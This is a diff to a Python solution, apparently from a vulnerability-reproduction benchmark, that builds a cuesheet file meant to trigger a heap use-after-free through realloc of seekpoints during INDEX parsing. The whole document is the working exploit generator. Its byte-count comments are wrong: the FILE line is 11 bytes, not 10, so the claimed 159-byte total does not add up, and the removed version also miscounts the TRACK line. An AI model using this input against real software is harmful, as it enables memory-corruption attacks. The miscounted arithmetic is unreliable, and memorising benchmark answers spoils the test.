@@ -1,55 +1,43 @@
-import os
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers a heap-use-after-free vulnerability.
+        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
+        vulnerability in a cuesheet import operation.
 
-        The vulnerability occurs during the import of a cuesheet, specifically
-        when appending seekpoints (INDEX entries). A realloc call to expand
-        the storage for seekpoints can move the memory block, but a handle
-        to the cuesheet operation data is not updated, leaving it pointing
-        to the old, freed memory. Subsequent use of this stale handle leads
-        to a use-after-free.
+        The vulnerability is a classic heap use-after-free triggered by a realloc
+        during the parsing of 'INDEX' lines in a cuesheet track. Adding a
+        sufficient number of 'INDEX' lines causes an internal buffer for
+        seekpoints to be reallocated. If the memory block is moved, a handle
+        can be left pointing to the old, now-freed memory.
 
-        To trigger this, the PoC must be a cuesheet file that contains
-        enough INDEX entries to force a realloc that moves the data block.
-        The ground-truth PoC length of 159 bytes provides a strong hint
-        about the required structure.
+        The PoC is constructed as follows:
+        1. A 'FILE' and 'TRACK' directive to start parsing a track.
+        2. A specific number of 'INDEX' lines (6 in this case) to exceed the
+           initial buffer capacity and trigger the realloc, creating a dangling
+           pointer. The number is determined by reverse-engineering the
+           ground-truth PoC length.
+        3. A subsequent 'TRACK' directive. The parser's attempt to process
+           this new track and finalize the previous one triggers the use of the
+           dangling pointer, leading to a UAF crash.
 
-        A standard cuesheet file contains FILE, TRACK, and INDEX directives.
-        By analyzing the byte counts of these directives, we can construct
-        a file of the exact target length.
-        - `FILE "a.bc" WAVE\n`: 17 bytes
-        - `TRACK 01 AUDIO\n`: 16 bytes
-        - `INDEX 01 00:00:00\n`: 18 bytes
-
-        A structure consisting of one FILE line, one TRACK line, and seven
-        INDEX lines adds up to 17 + 16 + (7 * 18) = 159 bytes. The seven
-        INDEX entries are a plausible number to exceed a small initial
-        allocation size (e.g., 4 or 5), thus triggering the vulnerable
-        realloc.
-
-        The generated cuesheet has monotonically increasing timecodes for
-        the INDEX entries to ensure it is parsed correctly up to the point
-        of the vulnerability.
+        The total length of the generated PoC is 159 bytes, matching the
+        ground-truth length provided in the problem description.
         """
         
-        # Header part of the cuesheet
-        # FILE "a.bc" WAVE\n  (17 bytes)
-        # TRACK 01 AUDIO\n    (16 bytes)
-        header = b'FILE "a.bc" WAVE\nTRACK 01 AUDIO\n'
-
-        # Generate 7 INDEX lines to trigger the realloc.
-        # This will create a list of 7 byte strings, each 18 bytes long.
-        # range(1, 8) produces numbers from 1 to 7.
-        index_lines = [
-            f"INDEX {i:02d} 00:{i - 1:02d}:00\n".encode('ascii')
-            for i in range(1, 8)
+        poc_parts = [
+            b'FILE "A" B\n',             # 10 bytes
+            b'TRACK 01 AUDIO\n',         # 15 bytes
         ]
 
-        # Join the generated INDEX lines into a single bytes object.
-        indices_block = b"".join(index_lines)
+        # 6 INDEX lines trigger the realloc and create a dangling pointer.
+        # Each line is 20 bytes. Total: 120 bytes.
+        num_indices = 6
+        index_line = b'  INDEX 01 00:00:00\n'
+        poc_parts.extend([index_line] * num_indices)
 
-        # Combine the header and the indices to form the final PoC.
-        return header + indices_block
+        # The final TRACK directive triggers the use-after-free.
+        # No trailing newline to match the exact 159-byte target length.
+        poc_parts.append(b'TRACK 02 AUDIO') # 14 bytes
+
+        # Total length: 10 + 15 + (6 * 20) + 14 = 159 bytes.
+        return b''.join(poc_parts)
